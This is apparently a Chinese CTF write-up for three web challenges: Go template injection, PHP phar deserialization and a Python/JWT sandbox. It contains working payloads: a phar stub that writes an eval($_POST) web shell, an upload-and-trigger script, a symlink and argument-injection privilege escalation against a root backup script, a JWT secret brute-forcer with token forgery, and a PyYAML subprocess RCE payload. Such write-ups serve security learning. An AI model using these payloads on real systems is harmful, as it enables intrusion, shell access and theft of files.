# 湾区杯wp

## ssti

​	输入`{{.}}`返回`map[B64Decode:0x6ee380 exec:0x6ee120]`，确认为go模板ssti,根据提供方法构建payload`{{ exec (B64Decode "Y2F0IC9mbGFn") }}`,使用base64编码绕过黑名单读取flag。

![image-20250908174223313](./assets/image-20250908174223313.png)

## easy_readfile

​	访问题目获得源码，我们可以通过`Acheron`上传Phar文件以及反序列化制定的Phar文件，我们可以写一个马传上去，之后反序列化释放马。

```php
<?php

$phar = new Phar('exp.phar');
$phar->startBuffering();
$stub = '<?php system(\'echo "<?php eval(\$_POST[114514]); ?>" > /var/www/html/114514.php\');__HALT_COMPILER();?>';
$phar->setStub($stub);
$phar->addFromString('114514.txt', '');
$phar->stopBuffering();
?>
```

​	为了防止黑名单过滤，我们使用gzip压缩后上传。

```python
import requests
import os

# 目标URL
TARGET_URL = "http://localhost:8888"  # 替换为实际目标URL

def upload_phar_file(file_path):
    """上传phar文件到目标服务器"""
    try:
        # 先使用mode=w上传文件内容
        with open(file_path, 'rb') as f:
            phar_content = f.read()
        
        # 构建POST数据，使用0作为键名
        data = {
            '0': phar_content,
            '1': 'O:7:"Acheron":1:{s:4:"mode";s:1:"w";}'
        }
        
        # 发送上传请求
        response = requests.post(TARGET_URL, data=data)
        
        if response.status_code == 200:
            # 从响应中获取保存的文件名
            filename = response.text.strip()
            print(f"文件上传成功，保存路径: {filename}")
            return filename
        else:
            print(f"文件上传失败，状态码: {response.status_code}")
            return None
    except Exception as e:
        print(f"上传过程出错: {str(e)}")
        return None

def trigger_deserialization(filename):
    """触发反序列化漏洞"""
    try:
        # 使用mode=r来包含文件，触发反序列化
        data = {
            '0': filename,
            '1': 'O:7:"Acheron":1:{s:4:"mode";s:1:"r";}'
        }
        
        response = requests.post(TARGET_URL, data=data)
        
        print(f"触发反序列化响应: {response.text}")
        return response.text
    except Exception as e:
        print(f"触发过程出错: {str(e)}")
        return None

if __name__ == "__main__":
    # 本地phar文件路径
    phar_file = "exp.phar.gz"
    
    # 检查文件是否存在
    if not os.path.exists(phar_file):
        print(f"错误: 文件 {phar_file} 不存在")
        exit(1)
    
    # 上传文件
    uploaded_filename = upload_phar_file(phar_file)
    uploaded_filename = uploaded_filename.split('/')[-1]  # 提取文件名部分
    uploaded_filename = f"/tmp/{uploaded_filename}"  # 构造上传后的路径
    print(f"提取的文件名: {uploaded_filename}")
    # 如果上传成功，触发反序列化
    if uploaded_filename:
        trigger_deserialization(uploaded_filename)
```

​	之后使用蚁剑连接获取shell，发现flag在目录`/flag`但是没有权限读取，但是通过查看进程发现有`run.sh`脚本并且使用root身份运行，主要实现了没十分钟将当前目录下`*`搬运到backup目录。

​	我们在当前目录创建flag文件软链接到/flag文件，之后创建`-b`和`-L`，等待后就可以在backup目录下flag文件查看到flag。

## ez_python

​	查看网站源码发现`/sandbox`和`/auth`接口，访问`/auth`接口获取到jwt token，base64解密之后获取到结构和加密算法，尝试伪造

```python
import jwt
jwt.encode({"username":"admin", "role":"admin"}, key='', algorithm='none')
```

​	服务器返回

```json
{"error":"JWT Decode Failed. Key Hint","hint":"Key starts with \"@o70xO$0%#qR9#**\". The 2 missing chars are alphanumeric (letters and numbers)."}
```

​	写一个脚本通过已知token爆破密钥

```python
import jwt
import string

def brute_force_jwt_key(known_prefix, jwt_token, algorithm='HS256'):
    """
    爆破JWT密钥的后两位字符
    
    参数:
        known_prefix: 已知的密钥前缀
        jwt_token: 待验证的JWT令牌
        algorithm: 使用的加密算法，默认HS256
    """
    # 可能的字符集：字母(大小写)、数字和常见符号
    chars = string.ascii_letters + string.digits + '!@#$%^&*()_+-=[]{}|;:,.<>?`~'
    
    print(f"开始爆破JWT密钥，已知前缀: {known_prefix}")
    print(f"使用算法: {algorithm}")
    print(f"总尝试次数: {len(chars) * len(chars)}")
    
    # 遍历所有可能的后两位字符组合
    for c1 in chars:
        for c2 in chars:
            # 构建完整密钥
            candidate_key = known_prefix + c1 + c2
            
            try:
                # 验证JWT签名
                jwt.decode(
                    jwt_token,
                    candidate_key,
                    algorithms=[algorithm],
                    options={"verify_signature": True}
                )
                # 如果验证成功，返回找到的密钥
                print(f"\n找到有效密钥: {candidate_key}")
                return candidate_key
            except jwt.InvalidSignatureError:
                # 签名无效，继续尝试
                continue
            except Exception as e:
                # 其他错误
                print(f"尝试密钥 {candidate_key} 时出错: {str(e)}")
                continue
    
    # 如果没有找到有效密钥
    print("\n未找到有效密钥")
    return None

if __name__ == "__main__":
    # 配置参数 - 请根据实际情况修改
    KNOWN_KEY_PREFIX = "@o70xO$0%#qR9#"  # 已知的密钥前缀
    JWT_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imd1ZXN0Iiwicm9sZSI6InVzZXIifQ.karYCKLm5IhtINWMSZkSe1nYvrhyg5TgsrEm7VR1D0E"           # 待验证的JWT令牌
    ALGORITHM = "HS256"                         # 使用的算法，通常是HS256
    
    # 执行爆破
    brute_force_jwt_key(KNOWN_KEY_PREFIX, JWT_TOKEN, ALGORITHM)
```

​	爆出来是`@o70xO$0%#qR9#m0`

​	伪造token，获取文件上传权限

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.-Ws9e4GwaL0hesqjmSuOKNmyximBStder-7VnXK0w70
```

​	写一个yaml实现rce找到flag并获取flag内容

```yam
command_result: !!python/object/apply:subprocess.check_output
  args:
    - [bash, -c, "cat /f1111ag"]
  kwargs:
    stdout: -1
    stderr: -2
```